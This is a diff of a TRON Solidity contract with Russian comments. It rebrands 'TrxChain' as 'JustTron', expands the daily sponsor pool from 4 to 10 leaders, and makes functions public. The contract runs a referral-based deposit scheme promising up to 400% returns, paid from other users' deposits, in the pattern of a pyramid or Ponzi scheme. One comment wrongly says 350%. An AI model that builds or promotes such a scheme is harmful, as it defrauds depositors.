@@ -1,6 +1,6 @@
 pragma solidity 0.5.10;
 
-contract TrxChain {
+contract JustTron {
     struct User {
         uint256 cycle;
         address upline;
@@ -226,12 +226,12 @@ contract TrxChain {
 
 
 
-    // метод накапливает 4 лидерам их награды и очищает список
+    // метод накапливает 10 лидерам их награды и очищает список
     function _drawPool() private {
         pool_last_draw = uint40(block.timestamp);
         pool_cycle++;
 
-        uint256 draw_amount = pool_balance / 10; // 10%  - Ежедневный рейтинг лучших пулов 3% от ВСЕХ депозитов, отведенных в пуле, каждые 24 часа 10% пула распределяется среди 4 лучших спонсоров по объему.⠀
+        uint256 draw_amount = pool_balance / 10; // 10%  - Ежедневный рейтинг лучших пулов 3% от ВСЕХ депозитов, отведенных в пуле, каждые 24 часа 10% пула распределяется среди 10 лучших спонсоров по объему.⠀
 
         for(uint8 i = 0; i < pool_bonuses.length; i++) {
             if(pool_top[i] == address(0)) break;
@@ -249,12 +249,12 @@ contract TrxChain {
         }
     }
 
-    function deposit(address _upline) payable external {
+    function deposit(address _upline) payable public {
         _setUpline(msg.sender, _upline);
         _deposit(msg.sender, msg.value);
     }
 
-    function withdraw() external {
+    function withdraw() public {
         (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender); // текущий депозит и макс вывод от депозита
 
         require(users[msg.sender].payouts < max_payout, "Full payouts"); // ывел весь депозит
@@ -324,11 +324,11 @@ contract TrxChain {
         }
     }
     // максимальный доход 400 %
-    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
+    function maxPayoutOf(uint256 _amount) pure public returns(uint256) {
         return _amount * 40 / 10; // 350% для изменения цикла
     }
     //возвращает текущий депозит и максимальный доход за вычетом выводов и наград для адреса
-    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
+    function payoutOf(address _addr) view public returns(uint256 payout, uint256 max_payout) {
         max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
 
         if(users[_addr].deposit_payouts < max_payout) {
@@ -342,20 +342,20 @@ contract TrxChain {
         }
     }
 
-    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
+    function userInfo(address _addr) view public returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
         return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
     }
 
-    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
+    function userInfoTotals(address _addr) view public returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
         return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
     }
 
-    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
+    function contractInfo() view public returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
         return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
     }
 
-    // озвращает инфо о 4 адресах оидерах и их балансах
-    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
+    // озвращает инфо о 10 адресах оидерах и их балансах
+    function poolTopInfo() view public returns(address[10] memory addrs, uint256[10] memory deps) {
         for(uint8 i = 0; i < pool_bonuses.length; i++) {
             if(pool_top[i] == address(0)) break;
 
